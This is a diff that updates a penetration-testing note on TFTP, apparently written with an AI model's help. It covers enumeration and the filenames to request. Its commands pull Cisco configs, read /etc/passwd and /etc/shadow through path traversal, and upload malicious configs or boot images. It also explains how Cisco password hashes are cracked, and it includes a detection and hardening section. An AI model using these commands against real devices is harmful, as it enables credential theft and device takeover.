@@ -1,111 +1,120 @@
+# TFTP
+
 #TFTP #TrivialFileTransferProtocol #filetransfer
 
 ## What is TFTP?
-Trivial File Transfer Protocol — simplified, unauthenticated file transfer protocol. No directory listing, no authentication, no encryption. Used in network booting (PXE), router/switch firmware updates, and embedded device configs.
 
-- Port **UDP 69** — TFTP (UDP only)
-- No authentication — access by knowing the filename
-- No directory listing — must know exact file path
-- Used by: routers, switches, IP phones, PXE boot servers
+Trivial File Transfer Protocol — a stripped-down, **unauthenticated, unencrypted** file transfer over **UDP 69**. No login, no directory listing, no path negotiation: you transfer a file only by knowing its exact name. It survives because network gear leans on it — PXE network boot, router/switch firmware and **config** transfer, IP-phone provisioning. On an engagement it's a quiet source of **device configs full of credentials**, and, when writable, a way to plant a malicious config or boot file.
+
+- Port **UDP 69** — TFTP (UDP only; no connection, so scans are less reliable)
+- No auth, no listing — you must know or guess the filename
+- Served by: routers, switches, IP phones, PXE/provisioning servers
 
 ---
 
-## TFTP Commands
+## Tools
 
-| Command | Description |
+| Tool | Use |
 |---|---|
-| `connect <host> [port]` | Set remote host (and optionally port) |
-| `get <remote_file> [local_file]` | Download file from server |
-| `put <local_file> [remote_file]` | Upload file to server |
-| `mode [ascii\|binary\|octet]` | Set transfer mode |
-| `status` | Show connection status, mode, timeout |
-| `verbose` | Toggle verbose output |
-| `trace` | Toggle packet tracing |
-| `timeout <seconds>` | Set per-packet timeout |
-| `quit` | Exit tftp client |
+| [[Tools/Scanning/NMAP\|NMAP]] | `tftp-enum` NSE + UDP service detection (`-sU`) |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/scanner/tftp/tftpbrute` (filename brute), `tftp` server module |
 
----
-
-## Connect / Access
-
-```bash
-# Connect and download (Linux)
-tftp <target>
-tftp> get filename.cfg
-
-# One-liner download
-tftp -g -r filename.cfg <target>
-tftp -g -r /etc/passwd <target>  # if server allows path traversal
-
-# One-liner upload
-tftp -p -l localfile.txt -r remotefile.txt <target>
-
-# TFTP client session
-tftp 10.129.14.28
-tftp> connect 10.129.14.28
-tftp> get config.cfg
-tftp> put malware.bin
-```
+The native client is `tftp` (from `tftp-hpa`), used inline below.
 
 ---
 
 ## Enumeration
 
 ```bash
-# Nmap
-nmap -p 69 --script tftp-enum -sU <target>
+# UDP service detection + filename enumeration
 nmap -sU -p 69 -sV <target>
+nmap -sU -p 69 --script tftp-enum <target>
 
-# Enumerate common filenames
+# Brute common filenames from a list
 nmap -sU -p 69 --script tftp-enum --script-args tftp-enum.filelist=filenames.txt <target>
 
-# Metasploit
+# Metasploit filename brute
 use auxiliary/scanner/tftp/tftpbrute
-# (brute force common filenames)
 ```
 
-### Common Files to Request
+### Common filenames to request
+
+```
+/etc/passwd  /etc/shadow          # if the server maps to a real FS / path traversal
+running-config  startup-config    # Cisco/network device configs
+cisco-confg  network-confg  router-confg  pix-confg
+pxelinux.0   pxelinux.cfg/default # PXE boot image + options
+```
+
+---
+
+## Connect / Access
 
 ```bash
-tftp> get /etc/passwd
-tftp> get /etc/shadow
-tftp> get cisco-confg          # Cisco running config
-tftp> get running-config       # Cisco/network device config
-tftp> get startup-config
-tftp> get network-confg
-tftp> get router-confg
-tftp> get pix-confg            # Cisco PIX firewall
+# One-liner download / upload
+tftp -g -r startup-config <target>          # get remote → local
+tftp -p -l local.cfg -r startup-config <target>   # put local → remote
+
+# Interactive session
+tftp <target>
+tftp> get running-config
+tftp> put malicious.cfg
+tftp> mode octet        # binary (firmware/images)
 ```
+
+| Command | Description |
+|---|---|
+| `connect <host> [port]` | Set remote host/port |
+| `get <remote> [local]` | Download |
+| `put <local> [remote]` | Upload |
+| `mode [ascii\|octet]` | Transfer mode (octet = binary) |
+| `status` / `verbose` / `trace` | Session info / debugging |
+| `quit` | Exit |
 
 ---
 
 ## Attack Vectors
 
-### Pull Sensitive Files (Network Devices)
+### Pull network-device configs (the main prize)
 
 ```bash
-# Cisco config typically has credentials in plaintext or type-5/type-7 hashes
 tftp -g -r startup-config <target>
 tftp -g -r running-config <target>
-
-# Crack Cisco Type-7 password (easily reversible)
-# Use online tools or ciscot7.py
 ```
 
-### Upload Malicious Config
+Cisco configs carry credentials: **Type-7** is trivially reversible (`ciscot7.py`, online decoders), **Type-5** (`$1$…` MD5-crypt) and **Type-8/9** are crackable with hashcat. SNMP community strings, VPN keys and enable secrets live here too. Full workflow: [[Techniques/Network Device Pentesting|Network Device Pentesting]].
+
+### Path traversal → arbitrary file read
 
 ```bash
-# If TFTP is writable, replace config or plant backdoor
+# Some TFTP servers don't confine to their root
+tftp -g -r ../../../../etc/passwd <target>
+tftp -g -r /etc/passwd <target>
+```
+
+### Upload malicious config / boot file (writable server)
+
+```bash
+# Replace a device config or plant a backdoored image
 tftp -p -l malicious.cfg -r startup-config <target>
 ```
 
-### PXE Boot Abuse
+### PXE boot abuse
 
 ```bash
-# TFTP often serves PXE boot images — pull the boot image
-tftp> get pxelinux.0
-tftp> get pxelinux.cfg/default  # may reveal boot options, network info
+# Pull the boot chain — pxelinux.cfg often leaks hostnames, kickstart URLs, and creds
+tftp -g -r pxelinux.0 <target>
+tftp -g -r pxelinux.cfg/default <target>
 ```
+
+---
+
+## Detection & Artefacts
+
+- **TFTP has no session or auth**, so the server log (if any) records only source IP + filename per RRQ/WRQ — a read of `startup-config` or a write of a boot file from an unexpected host is the tell.
+- **UDP + no connection** means requests are easy to spoof and easy to miss; NetFlow to UDP/69 from non-management hosts is the network-level signal.
+- **A changed config/boot file** on the device is the impact artefact — integrity-check firmware/config against a known-good baseline.
+- Defensive baseline: restrict TFTP to the management VLAN/ACL, make it read-only, never expose it to untrusted networks, and prefer SCP/SFTP for device transfers where the platform supports it.
 
 ---
 
@@ -113,11 +122,11 @@ tftp> get pxelinux.cfg/default  # may reveal boot options, network info
 
 | Setting | Risk |
 |---|---|
-| World-readable server directory | Anyone can download any file |
-| Writable server directory | Anyone can upload/replace files |
-| No firewall restriction | Accessible from internet |
-| Sensitive configs (passwords, keys) served | Credential exposure |
-| Path traversal possible | Read arbitrary filesystem files |
+| World-readable server directory | Anyone can download any served file |
+| Writable server directory | Anyone can upload/replace configs or boot images |
+| No firewall/ACL restriction | Reachable from untrusted networks |
+| Sensitive configs served (passwords, keys) | Credential exposure (Cisco Type-7/5, SNMP, VPN) |
+| Path traversal not blocked | Arbitrary filesystem read |
 
 ---
 
@@ -125,8 +134,19 @@ tftp> get pxelinux.cfg/default  # may reveal boot options, network info
 
 | Goal | Command |
 |---|---|
-| Download file | `tftp -g -r filename host` |
-| Upload file | `tftp -p -l local -r remote host` |
-| Interactive session | `tftp host` then `get filename` |
-| Common device config | `tftp -g -r running-config host` |
-| Nmap enum | `nmap -sU -p 69 --script tftp-enum host` |
+| UDP enum | `nmap -sU -p 69 --script tftp-enum host` |
+| Download | `tftp -g -r <file> host` |
+| Upload | `tftp -p -l local -r remote host` |
+| Device config | `tftp -g -r running-config host` |
+| Traversal read | `tftp -g -r ../../../../etc/passwd host` |
+| Interactive | `tftp host` → `get <file>` |
+
+---
+
+> [!note] **See also** — [[Techniques/Network Device Pentesting|Network Device Pentesting]] (Cisco config looting, Type-7/5 cracking); [[Services/Network management/SNMP|SNMP]] — a RW community pushes a device's running-config to your TFTP server (Cisco config-copy); file-transfer siblings [[Services/File Xfer/FTP|FTP]] and [[Services/File Xfer/SFTP|SFTP]]. Cisco ASA running-config exfil via SNMP config-copy lands here too — see [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]].
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
